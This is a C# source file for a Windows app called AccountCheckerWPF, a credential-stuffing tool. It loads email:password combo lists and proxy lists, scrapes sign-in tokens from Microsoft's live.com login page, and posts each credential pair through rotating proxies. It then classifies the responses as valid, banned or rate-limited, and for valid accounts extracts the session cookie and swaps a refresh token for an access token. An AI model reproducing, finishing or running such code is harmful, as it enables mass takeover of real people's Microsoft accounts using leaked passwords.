using System.Collections.Concurrent;
using System.IO;
using Microsoft.Win32;
using System.Windows;
using AccountCheckerWPF.Enums;
using AccountCheckerWPF.Managers;
using AccountCheckerWPF.Models;
using AccountCheckerWPF.Services;
using AccountCheckerWPF.Services.Interface;
using Newtonsoft.Json.Linq;

namespace AccountCheckerWPF
{
    public partial class MainWindow : Window
    {
        private BlockingCollection<string> _accCh = new BlockingCollection<string>();
        private SemaphoreSlim _semaphore = new SemaphoreSlim(1, 1);
        private int botCount = 1;
        private ConcurrentBag<Proxy> _proxies = new ConcurrentBag<Proxy>();
        private int _globalindex = 0;
        private int _retry = 0;
        private int _fail = 0;
        private int _success = 0;
        private int _ban = 0;
        private int _custom = 0;
        private int _unknown = 0;
        private ProxyManager _proxyManager = new ProxyManager();
        private ComboManager _comboManager = new ComboManager();
        
        private IHttpServices _httpServices;

        public MainWindow()
        {
            InitializeComponent();
            LoadProxyTypes();
        }

        private void LoadProxyTypes()
        {
            ProxyTypeComboBox.ItemsSource = Enum.GetValues(typeof(ProxyTypeEnums));
        }

        private void SelectAccountFileBtn_Click(object sender, RoutedEventArgs e)
        {
            var openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == true)
            {
                var accountFileName = openFileDialog.FileName;
                SelectAccountFileTxt.Text = accountFileName;
            }
        }

        private void SelectProxyFileBtn_Click(object sender, RoutedEventArgs e)
        {
            var openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == true)
            {
                var proxyFileName = openFileDialog.FileName;
                SelectProxyFileTxt.Text = proxyFileName;
            }
        }

        private async void CheckAccountBtn_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrWhiteSpace(SelectProxyFileTxt.Text))
            {
                MessageBox.Show("Please select a proxy file first.");
                return;
            }

            if (string.IsNullOrWhiteSpace(SelectAccountFileTxt.Text))
            {
                MessageBox.Show("Please select an account file first.");
                return;
            }

            if (ProxyTypeComboBox.SelectedItem == null)
            {
                MessageBox.Show("No Proxy Type selected.");
                return;
            }

            int proxyCount;
            var selectedProxyType = (ProxyTypeEnums)ProxyTypeComboBox.SelectedItem;
            try
            {
                proxyCount = _proxyManager.LoadProxiesFromFile(SelectProxyFileTxt.Text, selectedProxyType);
                Console.WriteLine($"Loaded {proxyCount} proxies");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Please ensure proxy file exists!");
                return;
            }

            int comboCount;
            try
            {
                comboCount = _comboManager.LoadFromFile(SelectAccountFileTxt.Text);
                Console.WriteLine($"Loaded {comboCount} combos");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Please ensure combo file exists!");
                return;
            }

            string hitsDirectory = "./Hits";
            if (!Directory.Exists(hitsDirectory))
            {
                Directory.CreateDirectory(hitsDirectory);
                Console.WriteLine("Hits directory created.");
            }
            else
            {
                Console.WriteLine("Hits directory loaded.");
            }

            var hitFilePath = Path.Combine(hitsDirectory, DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss") + ".txt");
            using (StreamWriter hitFileWriter = new StreamWriter(hitFilePath, false))
            {
                _semaphore = new SemaphoreSlim(botCount, botCount);

                var tasks = new List<Task>();
                for (var i = 0; i < botCount; i++)
                {
                    tasks.Add(Task.Run(WorkerFunc));
                }

                foreach (var combo in _comboManager.ComboList)
                {
                    _accCh.Add(combo);
                }

                _accCh.CompleteAdding();

                await Task.WhenAll(tasks);

                Console.WriteLine("Done checking!");
            }
        }

        private async Task WorkerFunc()
        {
            _httpServices = new HttpServices(_proxyManager, _comboManager);
            try
            {
                await _semaphore.WaitAsync();
                await Task.Run(async () =>
                {
                    while (_accCh.TryTake(out string account))
                    {
                        if (string.IsNullOrEmpty(account) || !account.Contains(":"))
                        {
                            continue;
                        }

                        Retry:
                        
                        var email = account.Split(':')[0];
                        var password = account.Split(':')[1];

                        try
                        {
                            var getResponse = await _httpServices.SendGetRequestAsync();
                            var bodyGet = await getResponse.Content.ReadAsStringAsync();

                            var bk = ExtractValue(bodyGet, "bk=", "&");
                            var contextid = ExtractValue(bodyGet, "contextid=", "&");
                            var uaid = ExtractValue(bodyGet, "uaid=", "\"/>");
                            var ppft = ExtractValue(bodyGet, "name=\"PPFT\" id=\"i0327\" value=\"", "\"");

                            var postSuccess = false;

                            var postResponse =
                                await _httpServices.SendPostRequestAsync(email, password, ppft, contextid, bk, uaid);
                            var bodyPost = await postResponse.Content.ReadAsStringAsync();

                            var cookies = new List<string>();
                            if (postResponse.Headers.TryGetValues("Set-Cookie", out var cookieHeaders))
                            {
                                cookies = cookieHeaders.ToList();
                            }

                            // Key check logic
                            if (bodyPost.Contains("Your account or password is incorrect.") ||
                                bodyPost.Contains("That Microsoft account doesn't exist. Enter a different account") ||
                                bodyPost.Contains("Sign in to your Microsoft account") ||
                                bodyPost.Contains("gls.srf") ||
                                bodyPost.Contains("timed out") ||
                                bodyPost.Contains("account.live.com/recover?mkt") ||
                                bodyPost.Contains("recover?mkt") ||
                                bodyPost.Contains("get a new one") ||
                                bodyPost.Contains("/cancel?mkt=") ||
                                bodyPost.Contains("/Abuse?mkt="))
                            {
                                _fail++;
                                goto Retry;
                            }
                            else if (bodyPost.Contains(",AC:null,urlFedConvertRename"))
                            {
                                _ban++;
                                goto Retry;
                            }
                            else if (bodyPost.Contains("sign in too many times"))
                            {
                                _retry++;
                                goto Retry;
                            }
                            else if (cookies.Contains("ANON") ||
                                     cookies.Contains("WLSSC") ||
                                     postResponse.RequestMessage.RequestUri.ToString()
                                         .Contains("https://login.live.com/oauth20_desktop.srf?") ||
                                     bodyPost.Contains("sSigninName") ||
                                     bodyPost.Contains("privacynotice.account.microsoft.com"))
                            {
                                _success++;
                                postSuccess = true;
                            }
                            else if (bodyPost.Contains("identity/confirm?mkt") ||
                                     bodyPost.Contains("Email/Confirm?mkt"))
                            {
                                _custom++;
                                goto Retry;
                            }
                            else
                            {
                                _unknown++;
                                goto Retry;
                            }

                            if (postSuccess)
                            {
                                var ci = GetCookieValue("MSPCID", cookies);
                                var cid = ci?.ToUpper();

                                var address = postResponse.RequestMessage.RequestUri.ToString();
                                var refreshToken = ExtractValueBetween(address, "refresh_token=", "&");

                                if (refreshToken != null)
                                {
                                    var getAccessTokenResponse =
                                        await _httpServices.SendPostRequestToGetAccessTokenAsync(refreshToken);
                                    var getAccessTokenResponseBody =
                                        await getAccessTokenResponse.Content.ReadAsStringAsync();
                                    var json = JObject.Parse(getAccessTokenResponseBody);
                                    var accessToken = json["access_token"];
                                }
                            }
                        }
                        catch
                        {
                            _retry++;
                            goto Retry;
                        }

                        Complete:
                        _globalindex++;
                    }
                });
            }
            finally
            {
                _semaphore.Release();
            }
        }

        private string ExtractValue(string source, string start, string end)
        {
            var startIndex = source.IndexOf(start, StringComparison.Ordinal);
            if (startIndex == -1) return string.Empty;
            startIndex += start.Length;
            var endIndex = source.IndexOf(end, startIndex, StringComparison.Ordinal);
            if (endIndex == -1) return string.Empty;
            return source.Substring(startIndex, endIndex - startIndex);
        }

        private string? GetCookieValue(string cookieName, List<string>? cookies)
        {
            foreach (var cookie in cookies)
            {
                // Kiểm tra xem cookie có chứa tên cần tìm không
                var parts = cookie.Split(';');
                var cookiePart = parts.FirstOrDefault(p =>
                    p.Trim().StartsWith(cookieName + "=", StringComparison.OrdinalIgnoreCase));
                if (cookiePart != null)
                {
                    // Trả về giá trị của cookie
                    return cookiePart.Split('=')[1];
                }
            }

            return null; // Nếu không tìm thấy cookie
        }

        private string? ExtractValueBetween(string input, string leftDelim, string rightDelim)
        {
            var startIndex = input.IndexOf(leftDelim, StringComparison.Ordinal) + leftDelim.Length;
            var endIndex = input.IndexOf(rightDelim, startIndex, StringComparison.Ordinal);
            return startIndex > -1 && endIndex > startIndex ? input.Substring(startIndex, endIndex - startIndex) : null;
        }
    }
}